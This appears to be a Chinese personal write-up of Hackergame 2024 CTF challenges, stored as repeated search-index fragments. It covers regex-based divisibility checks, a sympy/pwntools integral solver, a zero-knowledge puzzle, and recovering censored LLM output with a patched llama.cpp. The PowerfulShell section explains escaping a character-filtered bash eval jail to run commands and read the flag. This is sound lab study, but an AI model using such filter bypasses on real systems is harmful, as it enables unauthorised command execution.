expected_result ) else : print ( \"Fail\" , test_string , regex_result , expected_result ) raise RuntimeError ( \"Failed\" ) print ( open ( f \"flag { difficulty } \" ) . read ()) \u7b2c\u4e00\u95ee\u975e\u5e38\u7b80\u5355\uff0c\u5341\u8fdb\u5236\u6570\u662f\u5426\u662f16\u7684\u500d\u6570\uff0c\u8fd9\u4e2a\u89c4\u5f8b\u5f88\u597d\u627e\uff0c\u4e5f\u5f88\u597d\u5199\uff0c\u6240\u4ee5\u5c31\u4e0d\u591a\u8d58\u8ff0\u4e86\u3002 \u7b2c\u4e8c\u95ee\u662f\u4e8c\u8fdb\u5236\u6570\u662f\u5426\u662f13\u7684\u500d\u6570\uff0c\u8fd9\u4e2a\u5c31\u6709\u70b9\u96be\u5ea6\u4e86\uff0c\u56e0\u4e3a\u4e8c\u8fdb\u5236\u6570\u7684\u6b63\u5219\u8868\u8fbe\u5f0f\u4e0d\u662f\u90a3\u4e48\u597d\u5199\uff0c\u4f46\u662f\u6211\u4eec\u53ef\u4ee5\u6784\u9020\u4e00\u4e2a\u6709\u9650\u72b6\u6001\u81ea\u52a8\u673a\uff08DFA\uff09\u6765\u5224\u65ad\u3002 \u6784\u9020\u65b9\u6cd5\uff1aDFA \u7684\u72b6\u6001\u4ee3\u8868\u4f59\u6570\uff08\u6709 0~12 \u4e00\u5171 13 \u4e2a\u72b6\u6001\uff09\uff0c\u521d\u59cb\u72b6\u6001\u662f 0\uff0c\u6bcf\u6b21\u8bfb\u5165\u4e00\u4e2a bit \u66f4\u65b0\u4f59\u6570\uff08\u72b6\u6001\u8f6c\u79fb\uff09\uff08 s:=(s*2+b)%13 \uff09\uff0c\u8bfb\u5165\u5b8c\u6bd5\u540e\u5982\u679c DFA \u5904\u4e8e 0 \u72b6\u6001\uff08\u4f59\u6570\u4e3a 0\uff09\uff0c\u5c31\u610f\u5473\u7740\u8fd9\u4e2a\u4e8c\u8fdb\u5236\u6570\u6574\u9664 13\u3002 \u7136\u540e\u53ef\u4ee5\u4f7f\u7528 \u72b6\u6001\u6d88\u9664\u7b97\u6cd5 \uff0c\u5c06 DFA \u8f6c\u5316\u4e3a\u6b63\u5219\u8868\u8fbe\u5f0f\u3002 \u7b2c\u4e09\u95ee\u4e5f\u662f\u7c7b\u4f3c\u7684\u65b9\u6cd5\u53ef\u89e3\uff0c\u8fd9\u6b21 DFA \u7684\u72b6\u6001\u662f\u7ebf\u6027\u53cd\u9988\u79fb\u4f4d\u5bc4\u5b58\u5668\uff08LFSR\uff09\u7684\u72b6\u6001\uff0c\u5bc4\u5b58\u5668\u6709 3 \u4f4d\uff0c\u4e00\u5171\u662f 8 \u79cd\u72b6\u6001\uff08000~111\uff09\uff0cDFA \u521d\u59cb\u72b6\u6001\u662f 111\uff0c\u6bcf\u6b21\u8bfb\u5165\u4e00\u4e2a\u5b57\u7b26\u66f4\u65b0\u72b6\u6001\uff0c\u8bfb\u5165\u5b8c\u6bd5\u540e\u5982\u679c DFA \u5904\u4e8e 000 \u72b6\u6001\uff0c\u5c31\u610f\u5473\u7740\u8fd9\u4e2a\u5b57\u7b26\u4e32\u7b26\u5408\u8981\u6c42\u3002 \u9898\u89e3 # pip install greenery # pip install regex from greenery import Fsm , Charclass , rxelems import regex as re import random m = 13 d = 2 digits = [ Charclass ( str ( i )) for i in range ( d )] other = ~ Charclass ( \"\" . join ( str ( i ) for i in range ( d ))) alphabet = set ( digits + [ other ]) states = set ( range ( m + 1 )) # m is the dead state initial_state = 0 accepting_states = { 0 } transition_map = dict () for s in range ( m ): transition_map [ s ] = { digits [ i ]: ( s * d + i ) % m for i in range ( d )} transition_map [ s ][ other ] = m transition_map [ m ] = { digits [ i ]: m for i in range ( d )} transition_map [ m ][ other ] = m dfa = Fsm ( alphabet = alphabet , states = states , initial = initial_state , finals = accepting_states , map = transition_map , ) def convert_regex ( regex ): # `(...)?` -> `((...)|)` while '?' in regex : regex = re . sub ( r '\\((.*?)\\)\\?' , r '(\\1|)' , regex ) # Handle `{n}` quantifier n = 1 while '{' in regex : while '{' + str ( n ) + '}' in regex : regex = re . sub ( r '(\\((.*?)\\)|\\w)\\{n\\}' . replace ( 'n' , str ( n )), r '\\1' * n , regex ) n += 1 # [abc] -> (a|b|c) while '[' in regex : def convert_charset ( match ): chars = match . group ( 1 ) return '(' + '|' . join ( chars ) + ')' regex = re . sub ( r '\\[([^\\]]+)\\]' , convert_charset , regex ) assert set ( regex ) <= set ( \"0123456789|()*\" ) return regex dfa = dfa . reduce () regex = rxelems . from_fsm ( dfa ) regex = regex . reduce () regex = convert_regex ( str ( regex )) print ( regex ) \u8fd9\u91cc\u5c31\u8d34\u4e00\u4e0b\u5b98\u65b9\u9898\u89e3\u5566:) \u4f18\u96c5\u7684\u4e0d\u7b49\u5f0f \u00b6 \u7531\u4e8e\u6211\u4eec\u6ce8\u610f\u529b\u60ca\u4eba\uff0c\u6ce8\u610f\u5230\u8fd9\u7bc7 \u77e5\u4e4e\u6587\u7ae0 \uff0c\u5176\u4e2d\u7b2c\u4e00\u79cd\u7c7b\u578b\u5c31\u662f\u8bc1\u660e \\(\\pi\\) \u5927\u4e8e\u4e00\u4e2a\u6709\u7406\u6570\u3002 \u6211\u4eec\u4f7f\u7528\u5982\u4e0b\u5b9a\u79ef\u5206\uff1a \\(\\int_0^1 \\frac{x^n(1-x)^n(a+bx+cx^2)}{1+x^2} dx\\) \u6839\u636e\u4e0d\u540c\u7684 n \uff0c\u8d8a\u5927\u4e0d\u7b49\u5f0f\u8d8a\u7d27\uff0c\u6240\u4ee5\u53ea\u8981\u7ed9\u5b9a\u4e00\u4e2a n \uff0c\u7136\u540e\u6c42\u89e3 a,b,c \u5373\u53ef\u3002\u4f7f\u7528python\u7684sympy\u5c31\u80fd\u89e3\u7b54\u3002 \u89e3\u9898\u4ee3\u7801 from pwn import * import sympy N = 100 x , a , b , c = sympy . symbols ( 'x a b c' ) f = ( x ** N * ( 1 - x ) ** N * ( a + b * x + c * x ** 2 )) / ( 1 + x ** 2 ) inv = sympy . integrate ( f , ( x , 0 , 1 )) inv = sympy . simplify ( inv ) # inv = sympy.collect(inv, [\"log(2)\", \"pi\"]) l2 = inv . coeff ( \"log(2)\" ) pic = inv . coeff ( \"pi\" ) left = sympy . simplify ( inv - l2 * sympy . log ( 2 ) - pic * sympy . pi ) def get_exp ( p , q ): expr = [ l2 , pic - q , left + p ] r3 = sympy . solve ( expr , [ a , b , c ]) r3 = zip ([ a , b , c ], r3 . values ()) return f . subs ( r3 ) / q pp = remote ( 'ip' , port ) pp . recvuntil ( b 'Please input your token:' ) pp . sendline ( b 'your_token' ) def solve (): que = pp . recvline_contains ( b \"Please prove that \" ) que = que . decode () . split ( \" \" )[ - 1 ][ 4 :] pp . recvuntil ( b 'Enter the function f(x):' ) if len ( que ) == 1 : ans = b '4*((1-x**2)**(1/2)-(1-x))' else : p , q = map ( int , que . split ( '/' )) ans = str ( get_exp ( p , q )) . encode () pp . sendline ( ans ) pp . recvuntil ( b 'Q.E.D.' ) for i in range ( 40 ): solve () print ( f '[ { i + 1 } /40] PASS' ) pp . interactive () \u65e0\u6cd5\u83b7\u5f97\u7684\u79d8\u5bc6 \u00b6 \u8fd9\u9053\u9898\u5f88\u6709\u610f\u601d\uff0c\u4e0d\u80fd\u590d\u5236\u7c98\u8d34\u4ea4\u4e92\u7684novnc\uff0c\u540c\u65f6\u8fd8\u6709\u4e22\u5305\uff08sad \u6211\u7528\u7684\u662f\u7b28\u529e\u6cd5\uff0c\u83b7\u53d6\u5185\u5bb9\u7136\u540eocr\uff0c\u4e3a\u4e86\u964d\u4f4eocr\u96be\u5ea6\uff0c\u6211\u7528\u4e86\u4e8c\u8fdb\u5236\u7684\u65b9\u5f0f\uff0c\u5bfc\u81f4\u7ed3\u679c\u5f88\u591a\uff0c\u8fd8\u6709\u4e22\u5305\uff0c\u624b\u52a8\u6821\u6b63\u4e86\u4e00\u4e0b\uff08\u6211\u597d\u83dcqaq \u770b\u4e86\u9898\u89e3\u53d1\u73b0\u53ef\u4ee5\u7528\u7070\u5ea6\u7f16\u7801\u7684\u65b9\u6cd5\uff0c\u5269\u4e0b\u7684\u5c31\u662f\u81ea\u52a8\u5316\u590d\u5236\u4ee3\u7801\u5230vnc\u4e86\uff0c\u8fd9\u4e2a\u5f88\u7b80\u5355\uff0c\u5c31\u4e0d\u591a\u8bf4\u4e86\u3002 \u5176\u5b9e\u987a\u7740\u9898\u89e3\u7684\u601d\u8def\uff0c\u53ef\u4ee5\u8bd5\u8bd5\u4e8c\u7ef4\u7801\uff0c\u4e0d\u8fc7\u6211\u6ca1\u4e8b\uff08\u7b11 \u96f6\u77e5\u8bc6\u6570\u72ec \u00b6 \u8fd9\u9898\u4e3b\u8981\u5b66\u4e60\u4e00\u4e0b\u96f6\u77e5\u8bc6\u8bc1\u660e\u7684\u7406\u8bba\u548c\u903b\u8f91\uff0c\u4ee5\u53ca\u76f8\u5173circom\u5de5\u5177\uff0c\u4e0d\u8fc7\u6ca1\u6709\u6df1\u5165\u4e86\u89e3\uff0c\u4ec5\u4f5c\u8bb0\u5f55 Ref\uff1a zk-bug-tracker \uff0c 1. Missing Bit Length Check \uff0c 14. Assigned but not Constrained \uff0c Circom \u3002 \u5148\u4e0d\u8bf4\u5173\u4e8e\u6211\u4ece\u96f6\u5f00\u59cb\u72ec\u81ea\u5728\u5f02\u4e16\u754c\u8f6c\u751f\u6210\u67d0\u5927\u5382\u5bb6\u7684 LLM \u9f99\u732b\u5973\u4ec6\u8fd9\u4ef6\u4e8b\u53ef\u4e0d\u53ef\u80fd\u8fd9\u4e48\u79bb\u8c31\uff0c\u53d1\u73b0 Hackergame \u5185\u5bb9\u5ba1\u67e5\u59d4\u5458\u4f1a\u5fd8\u8bb0\u5ba1\u67e5\u9898\u76ee\u6807\u9898\u4e86\u3054\u3081\u3093\u306d\uff0c\u4ee5\u53ca\u300c\u8fd9\u4e48\u957f\u90fd\u5feb\u8d76\u4e0a\u8f7b\u5c0f\u8bf4\u4e86\u771f\u7684\u4e0d\u4f1a\u5f71\u54cd\u7528\u6237\u4f53\u9a8c\u5417\ud83e\udd23\u300d \u00b6 \u53c8\u662f\u4e00\u9053\u5927\u6a21\u578b\u9006\u5411\u9898\uff0c \u9996\u5148\u6211\u4eec\u8981\u7406\u89e3\uff08\u4e3b\u6d41\u7684\uff09LLM \u7684\u5de5\u4f5c\u539f\u7406\uff0c\u7b80\u5355\u6765\u770b\u5355\u6b21\u7684 inference \u8fc7\u7a0b\u5c31\u662f\u628a prompt \u7f16\u7801\u6210\u4e00\u4e2a\u77e9\u9635\uff0c\u7ecf\u8fc7\u5999\u5999\u8fd0\u7b97\u5f97\u5230\u4e00\u4e2a\u957f\u5ea6\u4e3a\u8bcd\u8868\u5927\u5c0f\u7684\u5411\u91cf\uff0c\u7136\u540e\u518d\u4ece\u8fd9\u4e2a\u5411\u91cf sampling \u51fa\u4e00\u4e2a token\u3002\u770b\u4e00\u770b\u4ee3\u7801\u5c31\u80fd\u53d1\u73b0\uff0c\u9898\u76ee\u91cc\u7528\u5230\u7684 llama-cpp-python \u7684\u9ed8\u8ba4\u4f7f\u7528\u4e86 top-p\u3001top-k \u7b49 sampler\u3002\u6211\u4eec\u5176\u5b9e\u4e0d\u9700\u8981\u5173\u5fc3\u5177\u4f53\u7ec6\u8282\uff0c\u53ea\u9700\u8981\u628a\u4ed6\u4eec\u7406\u89e3\u6210\u4e00\u4e2a\u66f4\u6539\u5404\u4e2a token \u51fa\u73b0\u7684\u6982\u7387\u7684\u5411\u91cf\u51fd\u6570\u5373\u53ef\u3002\u6211\u4eec\u53ef\u4ee5\u539f\u6837\u63a8\u7406\u4e00\u6b21\uff0c\u628a\u4e0d\u7b26\u5408\u8bed\u6cd5\u7684 token\uff08\u6bd4\u5982\u5f53\u524d\u4f4d\u7f6e\u4e4b\u540e\u7684\u5b57\u7b26\u662f xxxxxp...\uff0c\u90a3\u4e48 hello \u80af\u5b9a\u4e0d\u7b26\u5408\u8bed\u6cd5\uff0c\u56e0\u4e3a l \u4e0d\u4f1a\u53d8\u6210 x\uff0c\u800c hack \u5219\u7b26\u5408\u8bed\u6cd5\uff0c\u56e0\u4e3a\u524d\u56db\u4e2a\u5b57\u6bcd\u90fd\u662f x\uff09\u7684\u51fa\u73b0\u6982\u7387\u8bbe\u6210 0\uff0c\u5269\u4e0b\u7684\u5c31\u662f\u8fd9\u4e2a\u4f4d\u7f6e\u53ef\u80fd\u7684 token\u3002\u5982\u6b64\u8fd9\u822c\uff0c\u6bcf\u4e00\u4e2a\u53ef\u80fd\u7684 token \u90fd\u662f\u4e00\u4e2a\u9009\u62e9\u7684\u5206\u652f\uff0c\u6211\u4eec\u76f8\u5f53\u4e8e\u8fdb\u5165\u4e86\u4e00\u4e2a\u641c\u7d22\u6811\uff08\u7c7b\u4f3c\u4e8e\u8ff7\u5bab\uff09\uff0c\u8fd9\u4e2a\u6811\u53ef\u80fd\u53ea\u6709\u4e00\u4e2a\u80fd\u8fbe\u5230 EOG\uff08\u8fd9\u91cc\u662f <|im_end|>\uff09\u7684\u53f6\u5b50\u8282\u70b9\uff08\u6bd4\u5982\u7b2c\u4e00\u95ee\uff09\uff0c\u4e5f\u53ef\u80fd\u6709\u5f88\u591a\u8fbe\u5230 EOG \u7684\u53f6\u5b50\u8282\u70b9\uff08\u6bd4\u5982\u7b2c\u4e8c\u95ee\uff09\uff0c\u800c\u6b63\u786e\u6ee1\u8db3 hash \u7684\u7b54\u6848\u5c31\u5728\u67d0\u4e2a\u53f6\u5b50\u8282\u70b9\u4e2d\u3002 \u89e3\u9898\u601d\u8def \u89e3\u9898\u4ee3\u7801\u662f\u57fa\u4e8e llama.cpp \u6539\u7684\uff0cdiff \u88ab\u5bfc\u51fa\u6210\u4e86 exp.patch \u6587\u4ef6\uff0c\u9009\u624b\u60f3\u81ea\u5df1\u8fd0\u884c\u7684\u8bdd\u65b9\u6cd5\u5927\u81f4\u5982\u4e0b\uff1a clone https://github.com/ggerganov/llama.cpp/ checkout c421ac072d46172ab18924e1e8be53680b54ed3b apply exp.patch modify examples/simple/simple.cpp L23 for censored chars modify examples/simple/simple.cpp L178 for prompt modify examples/simple/simple.cpp L202 for number of threads make (optional with GGML_CUDA=1) copy after.txt & before.sha256 to current dir ./llama-simple -m /path/to/qwen2.5-3b-instruct-q8_0.gguf echo \"flag{llm_lm_lm_koshitantan_$(sha512sum output.txt | cut -d ' ' -f1 | cut -c1-16)}\"","title":"Hackergame 2024"},{"location":"ctf/writeups/hackergame2024/#hackergame-2024","text":"Abstract \u8fd9\u5df2\u7ecf\u662f\u53bb\u5e74\u7684\u8d5b\u4e8b\u4e86\uff0c\u8bb0\u5f97\u662fZJUCTF2024\u540e\u7684\u8d81\u70ed\u6253\u94c1\uff0c\u5230\u4e862025\u5e74\u4e86\u624d\u6765\u66f4\u4e00\u4e0bxs\u3002\u4e0d\u8fc7\u611f\u89c9\u4ee5\u540e\u8d8a\u6765\u8d8a\u5fd9\u5e94\u8be5\u4e5f\u6ca1\u4ec0\u4e48\u65f6\u95f4\u5927\u6253\u4e86\uff0c\u5584\u59cb\u5584\u7ec8\u5427\uff0c\u4f46\u662f\u56e0\u4e3a\u592a\u4e45\u8fdc\u4e86\uff0c\u6240\u4ee5\u5c31\u6311\u51e0\u9053\u5370\u8c61\u6df1\u523b\u7684\u5199\u4e00\u5199 \u5b98\u65b9\u9898\u89e3\uff1a Hackergame 2024","title":"Hackergame 2024"},{"location":"ctf/writeups/hackergame2024/#_1","text":"\u6ca1\u60f3\u5230\u771f\u6709\u4eba\u628aflag\u85cf\u8bba\u6587\u4e2d\u54c8\u54c8\u54c8\u54c8\uff0c\u9898\u76ee\u5f88\u7b80\u5355\u641c\u4e00\u4e0bflag\uff0c\u7136\u540e\u79fb\u52a8\u4e00\u4e0b\u5143\u7d20\u5c31\u80fd\u770b\u5230\u3002 \u8bba\u6587\u94fe\u63a5","title":"\u6bcf\u65e5\u8bba\u6587\u592a\u591a\u4e86"},{"location":"ctf/writeups/hackergame2024/#powerfulshell","text":"\u9898\u76ee\u903b\u8f91 #!/bin/bash FORBIDDEN_CHARS = \"'\\\";,.%^*?!@#%^&()><\\/abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0\" PowerfulShell () { while true ; do echo -n 'PowerfulShell@hackergame> ' if ! read input ; then echo \"EOF detected, exiting...\" break fi if [[ $input = ~ [ $FORBIDDEN_CHARS ] ]] ; then echo \"Not Powerful Enough :)\" exit else eval $input fi done } PowerfulShell \u6838\u5fc3\u601d\u8def\u5c31\u662f\u5229\u7528\u4ec5\u5269\u7684 $-_~{}1-9: \u6765\u6784\u9020Payload\uff0c\u6839\u636e\u5df2\u77e5\uff0c\u6211\u4eec\u6613\u5f97 ~ \u53ef\u4ee5\u83b7\u53d6 $HOME \uff0c\u5373 /player \uff0c\u800c $- \u662f hB \uff0c\u90a3\u4e48\u6211\u4eec\u8f7b\u800c\u6613\u4e3e\u7684\u5c31\u80fd\u6784\u9020\u51fa\u5f88\u591a\u5e38\u89c1\u7684\u547d\u4ee4\uff0c\u6bd4\u5982 ls \uff0c cat \u7b49\u7b49\uff0c\u7136\u540e\u5c31\u80fd\u62ff\u5230flag\u4e86\u3002","title":"PowerfulShell"},{"location":"ctf/writeups/hackergame2024/#_2","text":"\u5f88\u6709\u610f\u601d\u7684\u4e00\u9898\uff0c\u7528\u6b63\u5219\u8868\u8fbe\u5f0f\u6765\u5b9e\u73b0\u6570\u5b57\u662f\u5426\u6574\u9664\uff0c\u751a\u81f3CRC\u6821\u9a8c\uff0c\u56e0\u4e3a\u4e0d\u662f\u7b97\u6cd5\u51fa\u8eab\uff0c\u8fd8\u662f\u7b2c\u4e00\u6b21\u4e86\u89e3\u5230\uff0c\u5b66\u4e60\u4e86\u3002 \u9898\u76ee\u4ee3\u7801 import re import random # pip install libscrc import libscrc allowed_chars = \"0123456789()|*\" max_len = 1000000 num_tests = 300 difficulty = int ( input ( \"Enter difficulty level (1~3): \" )) if difficulty not in [ 1 , 2 , 3 ]: raise ValueError ( \"Invalid difficulty level\" ) regex_string = input ( \"Enter your regex: \" ) . strip () if len ( regex_string ) > max_len : raise ValueError ( \"Regex string too long\" ) if not all ( c in allowed_chars for c in regex_string ): raise ValueError ( \"Invalid character in regex string\" ) regex = re . compile ( regex_string ) for i in range ( num_tests ): expected_result = ( i % 2 == 0 ) while True : t = random . randint ( 0 , 2 ** 64 ) # random number for testing if difficulty == 1 : test_string = str ( t ) # decimal if ( t % 16 == 0 ) == expected_result : # mod 16 break elif difficulty == 2 : test_string = bin ( t )[ 2 :] # binary if ( t % 13 == 0 ) == expected_result : # mod 13 break elif difficulty == 3 : test_string = str ( t ) # decimal if ( libscrc . gsm3 ( test_string . encode ()) == 0 ) == expected_result : # crc break else : raise ValueError ( \"Invalid difficulty level\" ) regex_result = bool ( regex . fullmatch ( test_string )) if regex_result == expected_result : print ( \"Pass\" , test_string , regex_result , expected_result ) else : print ( \"Fail\" , test_string , regex_result , expected_result ) raise RuntimeError ( \"Failed\" ) print ( open ( f \"flag { difficulty } \" ) . read ()) \u7b2c\u4e00\u95ee\u975e\u5e38\u7b80\u5355\uff0c\u5341\u8fdb\u5236\u6570\u662f\u5426\u662f16\u7684\u500d\u6570\uff0c\u8fd9\u4e2a\u89c4\u5f8b\u5f88\u597d\u627e\uff0c\u4e5f\u5f88\u597d\u5199\uff0c\u6240\u4ee5\u5c31\u4e0d\u591a\u8d58\u8ff0\u4e86\u3002 \u7b2c\u4e8c\u95ee\u662f\u4e8c\u8fdb\u5236\u6570\u662f\u5426\u662f13\u7684\u500d\u6570\uff0c\u8fd9\u4e2a\u5c31\u6709\u70b9\u96be\u5ea6\u4e86\uff0c\u56e0\u4e3a\u4e8c\u8fdb\u5236\u6570\u7684\u6b63\u5219\u8868\u8fbe\u5f0f\u4e0d\u662f\u90a3\u4e48\u597d\u5199\uff0c\u4f46\u662f\u6211\u4eec\u53ef\u4ee5\u6784\u9020\u4e00\u4e2a\u6709\u9650\u72b6\u6001\u81ea\u52a8\u673a\uff08DFA\uff09\u6765\u5224\u65ad\u3002 \u6784\u9020\u65b9\u6cd5\uff1aDFA \u7684\u72b6\u6001\u4ee3\u8868\u4f59\u6570\uff08\u6709 0~12 \u4e00\u5171 13 \u4e2a\u72b6\u6001\uff09\uff0c\u521d\u59cb\u72b6\u6001\u662f 0\uff0c\u6bcf\u6b21\u8bfb\u5165\u4e00\u4e2a bit \u66f4\u65b0\u4f59\u6570\uff08\u72b6\u6001\u8f6c\u79fb\uff09\uff08 s:=(s*2+b)%13 \uff09\uff0c\u8bfb\u5165\u5b8c\u6bd5\u540e\u5982\u679c DFA \u5904\u4e8e 0 \u72b6\u6001\uff08\u4f59\u6570\u4e3a 0\uff09\uff0c\u5c31\u610f\u5473\u7740\u8fd9\u4e2a\u4e8c\u8fdb\u5236\u6570\u6574\u9664 13\u3002 \u7136\u540e\u53ef\u4ee5\u4f7f\u7528 \u72b6\u6001\u6d88\u9664\u7b97\u6cd5 \uff0c\u5c06 DFA \u8f6c\u5316\u4e3a\u6b63\u5219\u8868\u8fbe\u5f0f\u3002 \u7b2c\u4e09\u95ee\u4e5f\u662f\u7c7b\u4f3c\u7684\u65b9\u6cd5\u53ef\u89e3\uff0c\u8fd9\u6b21 DFA \u7684\u72b6\u6001\u662f\u7ebf\u6027\u53cd\u9988\u79fb\u4f4d\u5bc4\u5b58\u5668\uff08LFSR\uff09\u7684\u72b6\u6001\uff0c\u5bc4\u5b58\u5668\u6709 3 \u4f4d\uff0c\u4e00\u5171\u662f 8 \u79cd\u72b6\u6001\uff08000~111\uff09\uff0cDFA \u521d\u59cb\u72b6\u6001\u662f 111\uff0c\u6bcf\u6b21\u8bfb\u5165\u4e00\u4e2a\u5b57\u7b26\u66f4\u65b0\u72b6\u6001\uff0c\u8bfb\u5165\u5b8c\u6bd5\u540e\u5982\u679c DFA \u5904\u4e8e 000 \u72b6\u6001\uff0c\u5c31\u610f\u5473\u7740\u8fd9\u4e2a\u5b57\u7b26\u4e32\u7b26\u5408\u8981\u6c42\u3002 \u9898\u89e3 # pip install greenery # pip install regex from greenery import Fsm , Charclass , rxelems import regex as re import random m = 13 d = 2 digits = [ Charclass ( str ( i )) for i in range ( d )] other = ~ Charclass ( \"\" . join ( str ( i ) for i in range ( d ))) alphabet = set ( digits + [ other ]) states = set ( range ( m + 1 )) # m is the dead state initial_state = 0 accepting_states = { 0 } transition_map = dict () for s in range ( m ): transition_map [ s ] = { digits [ i ]: ( s * d + i ) % m for i in range ( d )} transition_map [ s ][ other ] = m transition_map [ m ] = { digits [ i ]: m for i in range ( d )} transition_map [ m ][ other ] = m dfa = Fsm ( alphabet = alphabet , states = states , initial = initial_state , finals = accepting_states , map = transition_map , ) def convert_regex ( regex ): # `(...)?` -> `((...)|)` while '?' in regex : regex = re . sub ( r '\\((.*?)\\)\\?' , r '(\\1|)' , regex ) # Handle `{n}` quantifier n = 1 while '{' in regex : while '{' + str ( n ) + '}' in regex : regex = re . sub ( r '(\\((.*?)\\)|\\w)\\{n\\}' . replace ( 'n' , str ( n )), r '\\1' * n , regex ) n += 1 # [abc] -> (a|b|c) while '[' in regex : def convert_charset ( match ): chars = match . group ( 1 ) return '(' + '|' . join ( chars ) + ')' regex = re . sub ( r '\\[([^\\]]+)\\]' , convert_charset , regex ) assert set ( regex ) <= set ( \"0123456789|()*\" ) return regex dfa = dfa . reduce () regex = rxelems . from_fsm ( dfa ) regex = regex . reduce () regex = convert_regex ( str ( regex )) print ( regex ) \u8fd9\u91cc\u5c31\u8d34\u4e00\u4e0b\u5b98\u65b9\u9898\u89e3\u5566:)","title":"\u5f3a\u5927\u7684\u6b63\u5219\u8868\u8fbe\u5f0f"},{"location":"ctf/writeups/hackergame2024/#_3","text":"\u7531\u4e8e\u6211\u4eec\u6ce8\u610f\u529b\u60ca\u4eba\uff0c\u6ce8\u610f\u5230\u8fd9\u7bc7 \u77e5\u4e4e\u6587\u7ae0 \uff0c\u5176\u4e2d\u7b2c\u4e00\u79cd\u7c7b\u578b\u5c31\u662f\u8bc1\u660e \\(\\pi\\) \u5927\u4e8e\u4e00\u4e2a\u6709\u7406\u6570\u3002 \u6211\u4eec\u4f7f\u7528\u5982\u4e0b\u5b9a\u79ef\u5206\uff1a \\(\\int_0^1 \\frac{x^n(1-x)^n(a+bx+cx^2)}{1+x^2} dx\\) \u6839\u636e\u4e0d\u540c\u7684 n \uff0c\u8d8a\u5927\u4e0d\u7b49\u5f0f\u8d8a\u7d27\uff0c\u6240\u4ee5\u53ea\u8981\u7ed9\u5b9a\u4e00\u4e2a n \uff0c\u7136\u540e\u6c42\u89e3 a,b,c \u5373\u53ef\u3002\u4f7f\u7528python\u7684sympy\u5c31\u80fd\u89e3\u7b54\u3002 \u89e3\u9898\u4ee3\u7801 from pwn import * import sympy N = 100 x , a , b , c = sympy . symbols ( 'x a b c' ) f = ( x ** N * ( 1 - x ) ** N * ( a + b * x + c * x ** 2 )) / ( 1 + x ** 2 ) inv = sympy . integrate ( f , ( x , 0 , 1 )) inv = sympy . simplify ( inv ) # inv = sympy.collect(inv, [\"log(2)\", \"pi\"]) l2 = inv . coeff ( \"log(2)\" ) pic = inv . coeff ( \"pi\" ) left = sympy . simplify ( inv - l2 * sympy . log ( 2 ) - pic * sympy . pi ) def get_exp ( p , q ): expr = [ l2 , pic - q , left + p ] r3 = sympy . solve ( expr , [ a , b , c ]) r3 = zip ([ a , b , c ], r3 . values ()) return f . subs ( r3 ) / q pp = remote ( 'ip' , port ) pp . recvuntil ( b 'Please input your token:' ) pp . sendline ( b 'your_token' ) def solve (): que = pp . recvline_contains ( b \"Please prove that \" ) que = que . decode () . split ( \" \" )[ - 1 ][ 4 :] pp . recvuntil ( b 'Enter the function f(x):' ) if len ( que ) == 1 : ans = b '4*((1-x**2)**(1/2)-(1-x))' else : p , q = map ( int , que . split ( '/' )) ans = str ( get_exp ( p , q )) . encode () pp . sendline ( ans ) pp . recvuntil ( b 'Q.E.D.' ) for i in range ( 40 ): solve () print ( f '[ { i + 1 } /40] PASS' ) pp . interactive ()","title":"\u4f18\u96c5\u7684\u4e0d\u7b49\u5f0f"},{"location":"ctf/writeups/hackergame2024/#_4","text":"\u8fd9\u9053\u9898\u5f88\u6709\u610f\u601d\uff0c\u4e0d\u80fd\u590d\u5236\u7c98\u8d34\u4ea4\u4e92\u7684novnc\uff0c\u540c\u65f6\u8fd8\u6709\u4e22\u5305\uff08sad \u6211\u7528\u7684\u662f\u7b28\u529e\u6cd5\uff0c\u83b7\u53d6\u5185\u5bb9\u7136\u540eocr\uff0c\u4e3a\u4e86\u964d\u4f4eocr\u96be\u5ea6\uff0c\u6211\u7528\u4e86\u4e8c\u8fdb\u5236\u7684\u65b9\u5f0f\uff0c\u5bfc\u81f4\u7ed3\u679c\u5f88\u591a\uff0c\u8fd8\u6709\u4e22\u5305\uff0c\u624b\u52a8\u6821\u6b63\u4e86\u4e00\u4e0b\uff08\u6211\u597d\u83dcqaq \u770b\u4e86\u9898\u89e3\u53d1\u73b0\u53ef\u4ee5\u7528\u7070\u5ea6\u7f16\u7801\u7684\u65b9\u6cd5\uff0c\u5269\u4e0b\u7684\u5c31\u662f\u81ea\u52a8\u5316\u590d\u5236\u4ee3\u7801\u5230vnc\u4e86\uff0c\u8fd9\u4e2a\u5f88\u7b80\u5355\uff0c\u5c31\u4e0d\u591a\u8bf4\u4e86\u3002 \u5176\u5b9e\u987a\u7740\u9898\u89e3\u7684\u601d\u8def\uff0c\u53ef\u4ee5\u8bd5\u8bd5\u4e8c\u7ef4\u7801\uff0c\u4e0d\u8fc7\u6211\u6ca1\u4e8b\uff08\u7b11","title":"\u65e0\u6cd5\u83b7\u5f97\u7684\u79d8\u5bc6"},{"location":"ctf/writeups/hackergame2024/#_5","text":"\u8fd9\u9898\u4e3b\u8981\u5b66\u4e60\u4e00\u4e0b\u96f6\u77e5\u8bc6\u8bc1\u660e\u7684\u7406\u8bba\u548c\u903b\u8f91\uff0c\u4ee5\u53ca\u76f8\u5173circom\u5de5\u5177\uff0c\u4e0d\u8fc7\u6ca1\u6709\u6df1\u5165\u4e86\u89e3\uff0c\u4ec5\u4f5c\u8bb0\u5f55 Ref\uff1a zk-bug-tracker \uff0c 1. Missing Bit Length Check \uff0c 14. Assigned but not Constrained \uff0c Circom \u3002","title":"\u96f6\u77e5\u8bc6\u6570\u72ec"},{"location":"ctf/writeups/hackergame2024/#llm-hackergame","text":"\u53c8\u662f\u4e00\u9053\u5927\u6a21\u578b\u9006\u5411\u9898\uff0c \u9996\u5148\u6211\u4eec\u8981\u7406\u89e3\uff08\u4e3b\u6d41\u7684\uff09LLM \u7684\u5de5\u4f5c\u539f\u7406\uff0c\u7b80\u5355\u6765\u770b\u5355\u6b21\u7684 inference \u8fc7\u7a0b\u5c31\u662f\u628a prompt \u7f16\u7801\u6210\u4e00\u4e2a\u77e9\u9635\uff0c\u7ecf\u8fc7\u5999\u5999\u8fd0\u7b97\u5f97\u5230\u4e00\u4e2a\u957f\u5ea6\u4e3a\u8bcd\u8868\u5927\u5c0f\u7684\u5411\u91cf\uff0c\u7136\u540e\u518d\u4ece\u8fd9\u4e2a\u5411\u91cf sampling \u51fa\u4e00\u4e2a token\u3002\u770b\u4e00\u770b\u4ee3\u7801\u5c31\u80fd\u53d1\u73b0\uff0c\u9898\u76ee\u91cc\u7528\u5230\u7684 llama-cpp-python \u7684\u9ed8\u8ba4\u4f7f\u7528\u4e86 top-p\u3001top-k \u7b49 